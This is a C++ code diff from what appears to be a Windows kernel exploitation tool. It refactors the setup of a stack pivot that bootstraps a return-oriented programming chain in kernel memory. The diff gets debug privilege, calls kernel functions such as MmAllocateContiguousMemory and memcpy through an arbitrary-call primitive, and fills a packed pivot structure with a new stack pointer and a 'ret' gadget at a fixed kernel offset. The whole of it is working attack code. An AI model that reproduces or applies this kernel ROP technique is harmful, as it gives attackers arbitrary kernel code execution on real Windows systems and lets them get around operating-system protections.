@@ -4,6 +4,30 @@
 #include <include/stack/stack_manager.hpp>
 #include <include/globals.hpp>
 
+#ifdef _MSC_VER
+#pragma pack(push, 1)
+#endif
+struct PivotData
+{
+    uint8_t Padding1[0x10];
+    void* NewRsp;           // Offset 0x10: New stack pointer
+    void* NewRbp;           // Offset 0x18: New base pointer
+    uint8_t Padding3[0x30];
+    void* JumpAddress;      // Offset 0x50: Jump target (rdx)
+};
+#if defined(__GNUC__) || defined(__clang__)
+__attribute__((packed))
+#endif
+;
+#ifdef _MSC_VER
+#pragma pack(pop)
+#endif
+
+static_assert(offsetof(PivotData, NewRsp) == 0x10, "NewRsp offset must be 0x10");
+static_assert(offsetof(PivotData, NewRbp) == 0x18, "NewRbp offset must be 0x18");
+static_assert(offsetof(PivotData, JumpAddress) == 0x50, "JumpAddress offset must be 0x50");
+static_assert(sizeof(PivotData) == 0x58, "PivotData size must be 0x58");
+
 int main()
 {
     if (!Utils::EnableDebugPrivilege())
@@ -39,7 +63,7 @@ int main()
 
     Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");
 
-    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x58, reinterpret_cast<void*>(MAXULONG64));
+    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(PivotData), reinterpret_cast<void*>(MAXULONG64));
     void* DestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
     void* SourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
     void* ObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
@@ -94,11 +118,19 @@ int main()
 
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
-    void* PivotJumpAddress = (void*)(Globals::KernelBase + 0x20043b);
-    void* NewRspAddress = (void*)((uint64_t)InitStackAllocation + 0x2000);
+    void* RetGadgetAddress = reinterpret_cast<void*>(Globals::KernelBase + 0x20043b);
+    void* NewRspAddress = reinterpret_cast<void*>(reinterpret_cast<std::uint64_t>(InitStackAllocation) + 0x2000);
 
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
+    PivotData BootstrapPivotData = {};
+    // Set RSP to the allocation of the first stack we will be execution, the 'initialization' stack.
+    BootstrapPivotData.NewRsp = NewRspAddress;
+    // RBP can be whatever, it's value doesn't seem to be affecting anything of importance to us.
+    BootstrapPivotData.NewRbp = NULL;
+    // Address we will be jumping to once the bootstrap gadget is done
+    // executing. We will just 'ret;' into the first gadget in our new stack.
+    BootstrapPivotData.JumpAddress = RetGadgetAddress;
+
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
     KernelCaller.Call<void*, void*, void*, size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
     KernelCaller.Call<void*, void*, void*, size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
     KernelCaller.Call<void*, void*, void*, size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
